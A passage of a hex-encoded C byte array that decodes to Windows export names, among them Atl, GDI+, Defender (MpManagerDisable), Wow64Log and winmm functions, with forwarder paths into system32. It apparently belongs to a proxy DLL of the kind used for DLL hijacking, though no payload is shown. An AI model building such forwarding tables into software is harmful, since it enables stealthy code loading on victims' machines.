	0x6E, 0x72, 0x65, 0x67, 0x69, 0x73, 0x74, 0x65, 0x72, 0x53, 0x65, 0x72, 0x76, 0x65, 0x72, 0x45,
	0x78, 0x00, 0x41, 0x74, 0x6C, 0x4D, 0x6F, 0x64, 0x75, 0x6C, 0x65, 0x55, 0x70, 0x64, 0x61, 0x74,
	0x65, 0x52, 0x65, 0x67, 0x69, 0x73, 0x74, 0x72, 0x79, 0x46, 0x72, 0x6F, 0x6D, 0x52, 0x65, 0x73,
	0x6F, 0x75, 0x72, 0x63, 0x65, 0x44, 0x00, 0x5C, 0x5C, 0x3F, 0x5C, 0x67, 0x6C, 0x6F, 0x62, 0x61,
	0x6C, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x72, 0x6F, 0x6F, 0x74,
	0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x33, 0x32, 0x5C, 0x61, 0x74, 0x6C, 0x2E, 0x41, 0x74,
	0x6C, 0x4D, 0x6F, 0x64, 0x75, 0x6C, 0x65, 0x55, 0x70, 0x64, 0x61, 0x74, 0x65, 0x52, 0x65, 0x67,
	0x69, 0x73, 0x74, 0x72, 0x79, 0x46, 0x72, 0x6F, 0x6D, 0x52, 0x65, 0x73, 0x6F, 0x75, 0x72, 0x63,
	0x65, 0x44, 0x00, 0x41, 0x74, 0x6C, 0x50, 0x69, 0x78, 0x65, 0x6C, 0x54, 0x6F, 0x48, 0x69, 0x4D,
	0x65, 0x74, 0x72, 0x69, 0x63, 0x00, 0x5C, 0x5C, 0x3F, 0x5C, 0x67, 0x6C, 0x6F, 0x62, 0x61, 0x6C,
	0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x72, 0x6F, 0x6F, 0x74, 0x5C,
	0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x33, 0x32, 0x5C, 0x61, 0x74, 0x6C, 0x2E, 0x41, 0x74, 0x6C,
	0x50, 0x69, 0x78, 0x65, 0x6C, 0x54, 0x6F, 0x48, 0x69, 0x4D, 0x65, 0x74, 0x72, 0x69, 0x63, 0x00,
	0x41, 0x74, 0x6C, 0x52, 0x65, 0x67, 0x69, 0x73, 0x74, 0x65, 0x72, 0x43, 0x6C, 0x61, 0x73, 0x73,
	0x43, 0x61, 0x74, 0x65, 0x67, 0x6F, 0x72, 0x69, 0x65, 0x73, 0x48, 0x65, 0x6C, 0x70, 0x65, 0x72,
	0x00, 0x5C, 0x5C, 0x3F, 0x5C, 0x67, 0x6C, 0x6F, 0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F, 0x74, 0x5C,
	0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65,
	0x6D, 0x33, 0x32, 0x5C, 0x61, 0x74, 0x6C, 0x2E, 0x41, 0x74, 0x6C, 0x52, 0x65, 0x67, 0x69, 0x73,
	0x74, 0x65, 0x72, 0x43, 0x6C, 0x61, 0x73, 0x73, 0x43, 0x61, 0x74, 0x65, 0x67, 0x6F, 0x72, 0x69,
	0x65, 0x73, 0x48, 0x65, 0x6C, 0x70, 0x65, 0x72, 0x00, 0x41, 0x74, 0x6C, 0x53, 0x65, 0x74, 0x45,
	0x72, 0x72, 0x6F, 0x72, 0x49, 0x6E, 0x66, 0x6F, 0x00, 0x5C, 0x5C, 0x3F, 0x5C, 0x67, 0x6C, 0x6F,
	0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x72, 0x6F,
	0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x33, 0x32, 0x5C, 0x61, 0x74, 0x6C, 0x2E,
	0x41, 0x74, 0x6C, 0x53, 0x65, 0x74, 0x45, 0x72, 0x72, 0x6F, 0x72, 0x49, 0x6E, 0x66, 0x6F, 0x00,
	0x41, 0x74, 0x6C, 0x53, 0x65, 0x74, 0x45, 0x72, 0x72, 0x6F, 0x72, 0x49, 0x6E, 0x66, 0x6F, 0x32,
	0x00, 0x5C, 0x5C, 0x3F, 0x5C, 0x67, 0x6C, 0x6F, 0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F, 0x74, 0x5C,
	0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65,
	0x6D, 0x33, 0x32, 0x5C, 0x61, 0x74, 0x6C, 0x2E, 0x41, 0x74, 0x6C, 0x53, 0x65, 0x74, 0x45, 0x72,
	0x72, 0x6F, 0x72, 0x49, 0x6E, 0x66, 0x6F, 0x32, 0x00, 0x41, 0x74, 0x6C, 0x55, 0x6E, 0x61, 0x64,
	0x76, 0x69, 0x73, 0x65, 0x00, 0x5C, 0x5C, 0x3F, 0x5C, 0x67, 0x6C, 0x6F, 0x62, 0x61, 0x6C, 0x72,
	0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73,
	0x79, 0x73, 0x74, 0x65, 0x6D, 0x33, 0x32, 0x5C, 0x61, 0x74, 0x6C, 0x2E, 0x41, 0x74, 0x6C, 0x55,
	0x6E, 0x61, 0x64, 0x76, 0x69, 0x73, 0x65, 0x00, 0x41, 0x74, 0x6C, 0x55, 0x6E, 0x6D, 0x61, 0x72,
	0x73, 0x68, 0x61, 0x6C, 0x50, 0x74, 0x72, 0x00, 0x5C, 0x5C, 0x3F, 0x5C, 0x67, 0x6C, 0x6F, 0x62,
	0x61, 0x6C, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x72, 0x6F, 0x6F,
	0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x33, 0x32, 0x5C, 0x61, 0x74, 0x6C, 0x2E, 0x41,
	0x74, 0x6C, 0x55, 0x6E, 0x6D, 0x61, 0x72, 0x73, 0x68, 0x61, 0x6C, 0x50, 0x74, 0x72, 0x00, 0x41,
	0x74, 0x6C, 0x57, 0x61, 0x69, 0x74, 0x57, 0x69, 0x74, 0x68, 0x4D, 0x65, 0x73, 0x73, 0x61, 0x67,
	0x65, 0x4C, 0x6F, 0x6F, 0x70, 0x00, 0x5C, 0x5C, 0x3F, 0x5C, 0x67, 0x6C, 0x6F, 0x62, 0x61, 0x6C,
	0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x72, 0x6F, 0x6F, 0x74, 0x5C,
	0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x33, 0x32, 0x5C, 0x61, 0x74, 0x6C, 0x2E, 0x41, 0x74, 0x6C,
	0x57, 0x61, 0x69, 0x74, 0x57, 0x69, 0x74, 0x68, 0x4D, 0x65, 0x73, 0x73, 0x61, 0x67, 0x65, 0x4C,
	0x6F, 0x6F, 0x70, 0x00, 0x43, 0x6C, 0x72, 0x43, 0x72, 0x65, 0x61, 0x74, 0x65, 0x4D, 0x61, 0x6E,
	0x61, 0x67, 0x65, 0x64, 0x49, 0x6E, 0x73, 0x74, 0x61, 0x6E, 0x63, 0x65, 0x00, 0x43, 0x6F, 0x72,
	0x42, 0x69, 0x6E, 0x64, 0x54, 0x6F, 0x52, 0x75, 0x6E, 0x74, 0x69, 0x6D, 0x65, 0x45, 0x78, 0x00,
	0x44, 0x69, 0x73, 0x63, 0x70, 0x45, 0x73, 0x74, 0x61, 0x62, 0x6C, 0x69, 0x73, 0x68, 0x53, 0x65,
	0x72, 0x76, 0x69, 0x63, 0x65, 0x4C, 0x69, 0x6E, 0x6B, 0x61, 0x67, 0x65, 0x00, 0x47, 0x64, 0x69,
	0x70, 0x41, 0x6C, 0x6C, 0x6F, 0x63, 0x00, 0x47, 0x64, 0x69, 0x70, 0x43, 0x6C, 0x6F, 0x6E, 0x65,
	0x49, 0x6D, 0x61, 0x67, 0x65, 0x00, 0x47, 0x64, 0x69, 0x70, 0x43, 0x72, 0x65, 0x61, 0x74, 0x65,
	0x42, 0x69, 0x74, 0x6D, 0x61, 0x70, 0x46, 0x72, 0x6F, 0x6D, 0x53, 0x74, 0x72, 0x65, 0x61, 0x6D,
	0x00, 0x47, 0x64, 0x69, 0x70, 0x43, 0x72, 0x65, 0x61, 0x74, 0x65, 0x46, 0x72, 0x6F, 0x6D, 0x48,
	0x44, 0x43, 0x00, 0x47, 0x64, 0x69, 0x70, 0x43, 0x72, 0x65, 0x61, 0x74, 0x65, 0x48, 0x42, 0x49,
	0x54, 0x4D, 0x41, 0x50, 0x46, 0x72, 0x6F, 0x6D, 0x42, 0x69, 0x74, 0x6D, 0x61, 0x70, 0x00, 0x47,
	0x64, 0x69, 0x70, 0x43, 0x72, 0x65, 0x61, 0x74, 0x65, 0x4C, 0x69, 0x6E, 0x65, 0x42, 0x72, 0x75,
	0x73, 0x68, 0x49, 0x00, 0x47, 0x64, 0x69, 0x70, 0x43, 0x72, 0x65, 0x61, 0x74, 0x65, 0x53, 0x6F,
	0x6C, 0x69, 0x64, 0x46, 0x69, 0x6C, 0x6C, 0x00, 0x47, 0x64, 0x69, 0x70, 0x44, 0x65, 0x6C, 0x65,
	0x74, 0x65, 0x42, 0x72, 0x75, 0x73, 0x68, 0x00, 0x47, 0x64, 0x69, 0x70, 0x44, 0x65, 0x6C, 0x65,
	0x74, 0x65, 0x47, 0x72, 0x61, 0x70, 0x68, 0x69, 0x63, 0x73, 0x00, 0x47, 0x64, 0x69, 0x70, 0x44,
	0x69, 0x73, 0x70, 0x6F, 0x73, 0x65, 0x49, 0x6D, 0x61, 0x67, 0x65, 0x00, 0x47, 0x64, 0x69, 0x70,
	0x46, 0x69, 0x6C, 0x6C, 0x52, 0x65, 0x63, 0x74, 0x61, 0x6E, 0x67, 0x6C, 0x65, 0x49, 0x00, 0x47,
	0x64, 0x69, 0x70, 0x46, 0x72, 0x65, 0x65, 0x00, 0x47, 0x64, 0x69, 0x70, 0x6C, 0x75, 0x73, 0x53,
	0x68, 0x75, 0x74, 0x64, 0x6F, 0x77, 0x6E, 0x00, 0x47, 0x64, 0x69, 0x70, 0x6C, 0x75, 0x73, 0x53,
	0x74, 0x61, 0x72, 0x74, 0x75, 0x70, 0x00, 0x49, 0x6E, 0x69, 0x74, 0x69, 0x61, 0x6C, 0x69, 0x7A,
	0x65, 0x4F, 0x53, 0x4B, 0x53, 0x75, 0x70, 0x70, 0x6F, 0x72, 0x74, 0x00, 0x49, 0x6E, 0x76, 0x61,
	0x6C, 0x69, 0x64, 0x61, 0x74, 0x65, 0x47, 0x61, 0x64, 0x67, 0x65, 0x74, 0x00, 0x4C, 0x6F, 0x61,
	0x64, 0x4C, 0x69, 0x62, 0x72, 0x61, 0x72, 0x79, 0x53, 0x68, 0x69, 0x6D, 0x00, 0x4D, 0x70, 0x47,
	0x65, 0x74, 0x45, 0x6E, 0x67, 0x69, 0x6E, 0x65, 0x56, 0x65, 0x72, 0x73, 0x69, 0x6F, 0x6E, 0x00,
	0x4D, 0x70, 0x4D, 0x61, 0x6E, 0x61, 0x67, 0x65, 0x72, 0x44, 0x69, 0x73, 0x61, 0x62, 0x6C, 0x65,
	0x00, 0x4D, 0x70, 0x4D, 0x61, 0x6E, 0x61, 0x67, 0x65, 0x72, 0x45, 0x6E, 0x61, 0x62, 0x6C, 0x65,
	0x00, 0x4D, 0x70, 0x4D, 0x61, 0x6E, 0x61, 0x67, 0x65, 0x72, 0x56, 0x65, 0x72, 0x73, 0x69, 0x6F,
	0x6E, 0x51, 0x75, 0x65, 0x72, 0x79, 0x00, 0x4D, 0x70, 0x4D, 0x65, 0x6D, 0x6F, 0x72, 0x79, 0x53,
	0x63, 0x61, 0x6E, 0x53, 0x74, 0x61, 0x72, 0x74, 0x00, 0x50, 0x6C, 0x61, 0x79, 0x53, 0x6F, 0x75,
	0x6E, 0x64, 0x57, 0x00, 0x5C, 0x5C, 0x3F, 0x5C, 0x67, 0x6C, 0x6F, 0x62, 0x61, 0x6C, 0x72, 0x6F,
	0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79,
	0x73, 0x74, 0x65, 0x6D, 0x33, 0x32, 0x5C, 0x77, 0x69, 0x6E, 0x6D, 0x6D, 0x2E, 0x50, 0x6C, 0x61,
	0x79, 0x53, 0x6F, 0x75, 0x6E, 0x64, 0x57, 0x00, 0x50, 0x70, 0x69, 0x45, 0x78, 0x74, 0x56, 0x32,
	0x43, 0x6C, 0x6F, 0x73, 0x65, 0x00, 0x50, 0x70, 0x69, 0x45, 0x78, 0x74, 0x56, 0x32, 0x43, 0x6F,
	0x6E, 0x74, 0x72, 0x6F, 0x6C, 0x00, 0x50, 0x70, 0x69, 0x45, 0x78, 0x74, 0x56, 0x32, 0x45, 0x6E,
	0x67, 0x69, 0x6E, 0x65, 0x00, 0x50, 0x70, 0x69, 0x45, 0x78, 0x74, 0x56, 0x32, 0x45, 0x6E, 0x75,
	0x6D, 0x65, 0x72, 0x61, 0x74, 0x65, 0x00, 0x50, 0x70, 0x69, 0x45, 0x78, 0x74, 0x56, 0x32, 0x4F,
	0x70, 0x65, 0x6E, 0x00, 0x50, 0x70, 0x69, 0x45, 0x78, 0x74, 0x56, 0x32, 0x51, 0x75, 0x65, 0x72,
	0x79, 0x00, 0x50, 0x70, 0x69, 0x45, 0x78, 0x74, 0x56, 0x32, 0x51, 0x75, 0x65, 0x72, 0x79, 0x45,
	0x78, 0x00, 0x50, 0x70, 0x69, 0x45, 0x78, 0x74, 0x56, 0x32, 0x52, 0x65, 0x6F, 0x70, 0x65, 0x6E,
	0x00, 0x50, 0x70, 0x69, 0x45, 0x78, 0x74, 0x56, 0x32, 0x53, 0x74, 0x61, 0x72, 0x74, 0x00, 0x53,
	0x65, 0x72, 0x76, 0x69, 0x63, 0x65, 0x4D, 0x61, 0x69, 0x6E, 0x00, 0x53, 0x76, 0x63, 0x68, 0x6F,
	0x73, 0x74, 0x50, 0x75, 0x73, 0x68, 0x53, 0x65, 0x72, 0x76, 0x69, 0x63, 0x65, 0x47, 0x6C, 0x6F,
	0x62, 0x61, 0x6C, 0x73, 0x00, 0x54, 0x61, 0x73, 0x6B, 0x44, 0x69, 0x61, 0x6C, 0x6F, 0x67, 0x49,
	0x6E, 0x64, 0x69, 0x72, 0x65, 0x63, 0x74, 0x00, 0x55, 0x6E, 0x69, 0x6E, 0x69, 0x74, 0x69, 0x61,
	0x6C, 0x69, 0x7A, 0x65, 0x4F, 0x53, 0x4B, 0x53, 0x75, 0x70, 0x70, 0x6F, 0x72, 0x74, 0x00, 0x57,
	0x64, 0x69, 0x44, 0x69, 0x61, 0x67, 0x6E, 0x6F, 0x73, 0x74, 0x69, 0x63, 0x4D, 0x6F, 0x64, 0x75,
	0x6C, 0x65, 0x4D, 0x61, 0x69, 0x6E, 0x00, 0x57, 0x64, 0x69, 0x47, 0x65, 0x74, 0x44, 0x69, 0x61,
	0x67, 0x6E, 0x6F, 0x73, 0x74, 0x69, 0x63, 0x4D, 0x6F, 0x64, 0x75, 0x6C, 0x65, 0x49, 0x6E, 0x74,
	0x65, 0x72, 0x66, 0x61, 0x63, 0x65, 0x56, 0x65, 0x72, 0x73, 0x69, 0x6F, 0x6E, 0x00, 0x57, 0x64,
	0x69, 0x48, 0x61, 0x6E, 0x64, 0x6C, 0x65, 0x49, 0x6E, 0x73, 0x74, 0x61, 0x6E, 0x63, 0x65, 0x00,
	0x57, 0x6F, 0x77, 0x36, 0x34, 0x4C, 0x6F, 0x67, 0x49, 0x6E, 0x69, 0x74, 0x69, 0x61, 0x6C, 0x69,
	0x7A, 0x65, 0x00, 0x57, 0x6F, 0x77, 0x36, 0x34, 0x4C, 0x6F, 0x67, 0x4D, 0x65, 0x73, 0x73, 0x61,
	0x67, 0x65, 0x41, 0x72, 0x67, 0x4C, 0x69, 0x73, 0x74, 0x00, 0x57, 0x6F, 0x77, 0x36, 0x34, 0x4C,
	0x6F, 0x67, 0x53, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x53, 0x65, 0x72, 0x76, 0x69, 0x63, 0x65, 0x00,
	0x57, 0x6F, 0x77, 0x36, 0x34, 0x4C, 0x6F, 0x67, 0x54, 0x65, 0x72, 0x6D, 0x69, 0x6E, 0x61, 0x74,
	0x65, 0x00, 0x6D, 0x69, 0x64, 0x69, 0x49, 0x6E, 0x4D, 0x65, 0x73, 0x73, 0x61, 0x67, 0x65, 0x00,
	0x5C, 0x5C, 0x3F, 0x5C, 0x67, 0x6C, 0x6F, 0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73,
	0x79, 0x73, 0x74, 0x65, 0x6D, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D,
	0x33, 0x32, 0x5C, 0x77, 0x69, 0x6E, 0x6D, 0x6D, 0x2E, 0x6D, 0x69, 0x64, 0x69, 0x49, 0x6E, 0x4D,
	0x65, 0x73, 0x73, 0x61, 0x67, 0x65, 0x00, 0x6D, 0x69, 0x64, 0x69, 0x4F, 0x75, 0x74, 0x47, 0x65,
	0x74, 0x45, 0x72, 0x72, 0x6F, 0x72, 0x54, 0x65, 0x78, 0x74, 0x57, 0x00, 0x5C, 0x5C, 0x3F, 0x5C,
	0x67, 0x6C, 0x6F, 0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65,
	0x6D, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x33, 0x32, 0x5C, 0x77,
	0x69, 0x6E, 0x6D, 0x6D, 0x2E, 0x6D, 0x69, 0x64, 0x69, 0x4F, 0x75, 0x74, 0x47, 0x65, 0x74, 0x45,
	0x72, 0x72, 0x6F, 0x72, 0x54, 0x65, 0x78, 0x74, 0x57, 0x00, 0x6D, 0x69, 0x64, 0x69, 0x4F, 0x75,
	0x74, 0x47, 0x65, 0x74, 0x4E, 0x75, 0x6D, 0x44, 0x65, 0x76, 0x73, 0x00, 0x5C, 0x5C, 0x3F, 0x5C,
	0x67, 0x6C, 0x6F, 0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65,
	0x6D, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x33, 0x32, 0x5C, 0x77,
	0x69, 0x6E, 0x6D, 0x6D, 0x2E, 0x6D, 0x69, 0x64, 0x69, 0x4F, 0x75, 0x74, 0x47, 0x65, 0x74, 0x4E,
	0x75, 0x6D, 0x44, 0x65, 0x76, 0x73, 0x00, 0x6D, 0x69, 0x64, 0x69, 0x4F, 0x75, 0x74, 0x4D, 0x65,
	0x73, 0x73, 0x61, 0x67, 0x65, 0x00, 0x5C, 0x5C, 0x3F, 0x5C, 0x67, 0x6C, 0x6F, 0x62, 0x61, 0x6C,
	0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x72, 0x6F, 0x6F, 0x74, 0x5C,
	0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x33, 0x32, 0x5C, 0x77, 0x69, 0x6E, 0x6D, 0x6D, 0x2E, 0x6D,
	0x69, 0x64, 0x69, 0x4F, 0x75, 0x74, 0x4D, 0x65, 0x73, 0x73, 0x61, 0x67, 0x65, 0x00, 0x6D, 0x69,
	0x64, 0x69, 0x4F, 0x75, 0x74, 0x50, 0x72, 0x65, 0x70, 0x61, 0x72, 0x65, 0x48, 0x65, 0x61, 0x64,
	0x65, 0x72, 0x00, 0x5C, 0x5C, 0x3F, 0x5C, 0x67, 0x6C, 0x6F, 0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F,
	0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73,
	0x74, 0x65, 0x6D, 0x33, 0x32, 0x5C, 0x77, 0x69, 0x6E, 0x6D, 0x6D, 0x2E, 0x6D, 0x69, 0x64, 0x69,
	0x4F, 0x75, 0x74, 0x50, 0x72, 0x65, 0x70, 0x61, 0x72, 0x65, 0x48, 0x65, 0x61, 0x64, 0x65, 0x72,
	0x00, 0x6D, 0x69, 0x64, 0x69, 0x4F, 0x75, 0x74, 0x52, 0x65, 0x73, 0x65, 0x74, 0x00, 0x5C, 0x5C,
	0x3F, 0x5C, 0x67, 0x6C, 0x6F, 0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73,
	0x74, 0x65, 0x6D, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x33, 0x32,
	0x5C, 0x77, 0x69, 0x6E, 0x6D, 0x6D, 0x2E, 0x6D, 0x69, 0x64, 0x69, 0x4F, 0x75, 0x74, 0x52, 0x65,
	0x73, 0x65, 0x74, 0x00, 0x6D, 0x69, 0x64, 0x69, 0x4F, 0x75, 0x74, 0x55, 0x6E, 0x70, 0x72, 0x65,
	0x70, 0x61, 0x72, 0x65, 0x48, 0x65, 0x61, 0x64, 0x65, 0x72, 0x00, 0x5C, 0x5C, 0x3F, 0x5C, 0x67,
	0x6C, 0x6F, 0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D,
	0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x33, 0x32, 0x5C, 0x77, 0x69,
	0x6E, 0x6D, 0x6D, 0x2E, 0x6D, 0x69, 0x64, 0x69, 0x4F, 0x75, 0x74, 0x55, 0x6E, 0x70, 0x72, 0x65,
	0x70, 0x61, 0x72, 0x65, 0x48, 0x65, 0x61, 0x64, 0x65, 0x72, 0x00, 0x6D, 0x69, 0x64, 0x69, 0x53,
	0x74, 0x72, 0x65, 0x61, 0x6D, 0x43, 0x6C, 0x6F, 0x73, 0x65, 0x00, 0x5C, 0x5C, 0x3F, 0x5C, 0x67,
	0x6C, 0x6F, 0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D,
	0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x33, 0x32, 0x5C, 0x77, 0x69,
	0x6E, 0x6D, 0x6D, 0x2E, 0x6D, 0x69, 0x64, 0x69, 0x53, 0x74, 0x72, 0x65, 0x61, 0x6D, 0x43, 0x6C,
	0x6F, 0x73, 0x65, 0x00, 0x6D, 0x69, 0x64, 0x69, 0x53, 0x74, 0x72, 0x65, 0x61, 0x6D, 0x4F, 0x70,
	0x65, 0x6E, 0x00, 0x5C, 0x5C, 0x3F, 0x5C, 0x67, 0x6C, 0x6F, 0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F,
	0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73,
	0x74, 0x65, 0x6D, 0x33, 0x32, 0x5C, 0x77, 0x69, 0x6E, 0x6D, 0x6D, 0x2E, 0x6D, 0x69, 0x64, 0x69,
	0x53, 0x74, 0x72, 0x65, 0x61, 0x6D, 0x4F, 0x70, 0x65, 0x6E, 0x00, 0x6D, 0x69, 0x64, 0x69, 0x53,
	0x74, 0x72, 0x65, 0x61, 0x6D, 0x4F, 0x75, 0x74, 0x00, 0x5C, 0x5C, 0x3F, 0x5C, 0x67, 0x6C, 0x6F,
	0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x72, 0x6F,
	0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x33, 0x32, 0x5C, 0x77, 0x69, 0x6E, 0x6D,
	0x6D, 0x2E, 0x6D, 0x69, 0x64, 0x69, 0x53, 0x74, 0x72, 0x65, 0x61, 0x6D, 0x4F, 0x75, 0x74, 0x00,
	0x6D, 0x69, 0x64, 0x69, 0x53, 0x74, 0x72, 0x65, 0x61, 0x6D, 0x50, 0x61, 0x75, 0x73, 0x65, 0x00,
	0x5C, 0x5C, 0x3F, 0x5C, 0x67, 0x6C, 0x6F, 0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73,
	0x79, 0x73, 0x74, 0x65, 0x6D, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D,
	0x33, 0x32, 0x5C, 0x77, 0x69, 0x6E, 0x6D, 0x6D, 0x2E, 0x6D, 0x69, 0x64, 0x69, 0x53, 0x74, 0x72,
	0x65, 0x61, 0x6D, 0x50, 0x61, 0x75, 0x73, 0x65, 0x00, 0x6D, 0x69, 0x64, 0x69, 0x53, 0x74, 0x72,
	0x65, 0x61, 0x6D, 0x50, 0x6F, 0x73, 0x69, 0x74, 0x69, 0x6F, 0x6E, 0x00, 0x5C, 0x5C, 0x3F, 0x5C,
	0x67, 0x6C, 0x6F, 0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65,
	0x6D, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x33, 0x32, 0x5C, 0x77,
	0x69, 0x6E, 0x6D, 0x6D, 0x2E, 0x6D, 0x69, 0x64, 0x69, 0x53, 0x74, 0x72, 0x65, 0x61, 0x6D, 0x50,
	0x6F, 0x73, 0x69, 0x74, 0x69, 0x6F, 0x6E, 0x00, 0x6D, 0x69, 0x64, 0x69, 0x53, 0x74, 0x72, 0x65,
	0x61, 0x6D, 0x50, 0x72, 0x6F, 0x70, 0x65, 0x72, 0x74, 0x79, 0x00, 0x5C, 0x5C, 0x3F, 0x5C, 0x67,
	0x6C, 0x6F, 0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D,
	0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x33, 0x32, 0x5C, 0x77, 0x69,
	0x6E, 0x6D, 0x6D, 0x2E, 0x6D, 0x69, 0x64, 0x69, 0x53, 0x74, 0x72, 0x65, 0x61, 0x6D, 0x50, 0x72,
	0x6F, 0x70, 0x65, 0x72, 0x74, 0x79, 0x00, 0x6D, 0x69, 0x64, 0x69, 0x53, 0x74, 0x72, 0x65, 0x61,
	0x6D, 0x52, 0x65, 0x73, 0x74, 0x61, 0x72, 0x74, 0x00, 0x5C, 0x5C, 0x3F, 0x5C, 0x67, 0x6C, 0x6F,
	0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x72, 0x6F,
	0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x33, 0x32, 0x5C, 0x77, 0x69, 0x6E, 0x6D,
	0x6D, 0x2E, 0x6D, 0x69, 0x64, 0x69, 0x53, 0x74, 0x72, 0x65, 0x61, 0x6D, 0x52, 0x65, 0x73, 0x74,
	0x61, 0x72, 0x74, 0x00, 0x6D, 0x69, 0x78, 0x65, 0x72, 0x47, 0x65, 0x74, 0x43, 0x6F, 0x6E, 0x74,
	0x72, 0x6F, 0x6C, 0x44, 0x65, 0x74, 0x61, 0x69, 0x6C, 0x73, 0x57, 0x00, 0x5C, 0x5C, 0x3F, 0x5C,
	0x67, 0x6C, 0x6F, 0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65,
	0x6D, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x33, 0x32, 0x5C, 0x77,
	0x69, 0x6E, 0x6D, 0x6D, 0x2E, 0x6D, 0x69, 0x78, 0x65, 0x72, 0x47, 0x65, 0x74, 0x43, 0x6F, 0x6E,
	0x74, 0x72, 0x6F, 0x6C, 0x44, 0x65, 0x74, 0x61, 0x69, 0x6C, 0x73, 0x57, 0x00, 0x6D, 0x69, 0x78,
	0x65, 0x72, 0x47, 0x65, 0x74, 0x44, 0x65, 0x76, 0x43, 0x61, 0x70, 0x73, 0x57, 0x00, 0x5C, 0x5C,
	0x3F, 0x5C, 0x67, 0x6C, 0x6F, 0x62, 0x61, 0x6C, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73,
	0x74, 0x65, 0x6D, 0x72, 0x6F, 0x6F, 0x74, 0x5C, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x33, 0x32,
	0x5C, 0x77, 0x69, 0x6E, 0x6D, 0x6D, 0x2E, 0x6D, 0x69, 0x78, 0x65, 0x72, 0x47, 0x65, 0x74, 0x44,
